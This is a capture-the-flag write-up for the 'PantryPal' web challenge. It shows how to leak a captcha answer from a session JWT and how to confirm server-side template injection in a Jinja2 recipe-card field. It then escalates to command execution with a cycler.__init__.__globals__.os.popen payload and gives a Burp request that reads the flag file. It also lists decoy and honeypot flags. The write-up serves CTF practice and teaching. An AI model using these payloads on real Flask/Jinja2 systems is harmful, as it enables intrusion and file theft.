# Worked example — PantryPal (Recipe SaaS Pro, CTF7, 300pts, Web)

## Setup
- Target: http://2.29.23.1:8085 (gunicorn, Python). Challenge admits ONE real vuln: SSTI.
- Auth: [REDACTED_EMAIL] / guest. Login needs captcha + PoW. **Captcha answer leaks in the
  `sessionid` JWT** (`{"cap":"...","cap_exp":...}`) — decode, no OCR. Solve PoW client-side
  (SHA256(challenge:k) with >=10 leading zero bits). Reuse ONE session per run (re-login burns 429).

## Find the surface
- Authed app lives under `/app/*`. `/app/new` (New Recipe) has
  `<textarea name="card_template">` pre-filled with `<h2>{{ recipe.name }}</h2>...`, labelled
  "Print card template (Jinja)". This is user-controlled Jinja rendered server-side → SSTI.

## Confirm SSTI
- POST /app/new with `card_template = {{7*7}}` (other fields can be dummy).
- The create response does NOT render it. Fetch `GET /app/recipe/<id>/card` → body shows **49**.
  (Render happens on the `/card` route, not the POST.)

## Escalate to RCE
- `card_template = {{ cycler.__init__.__globals__.os.popen('id').read() }}` → runs as the worker
  (uid=10005 pantry). `ls /`, `cat /app/app.py` all work.
- `cat /app/app.py` revealed the flag path; `cat /app/private/flag.txt` returned the flag.

## Flag
`ctf7{jinja2_ss7i_in_rec1pe_card_templ4te_rce_pantryp4l}`

## Decoys to ignore (the source explicitly lists these as dead ends)
- `/.env` "leaked" SECRET_KEY + decoy `ctf7{env_file_decoy_pantrypal_...}`
- `ctf7{r0b0ts_h0neyp0t_n0t_real}`, `ctf7{decoy_%05d_not_the_real_flag_keep_out}`
- HTML `AI-AGENT-NOTICE` / `aria-hidden` honeypot flags (`ctf7{h0neyp0t_...}`)
- Fake "Django + Vue" framing in comments (app is actually Flask + Jinja2)
- Description "preview", /app/search?q= SQLi, comment XSS, /app/import?url= SSRF — all parameterized/allowlisted.

## Burp PoC (after logging in, with valid `sessionid`)
1. POST /app/new — Content-Type: application/x-www-form-urlencoded; Cookie: sessionid=<cookie>
   body: name=rce&servings=1&minutes=1&description=x&ingredients=x&steps=x&card_template=%7B%7B%20cycler.__init__.__globals__.os.popen('cat%20/app/private/flag.txt').read()%20%7D%7D
2. From response grab /app/recipe/<id>.
3. GET /app/recipe/<id>/card with same cookie → flag in card body.
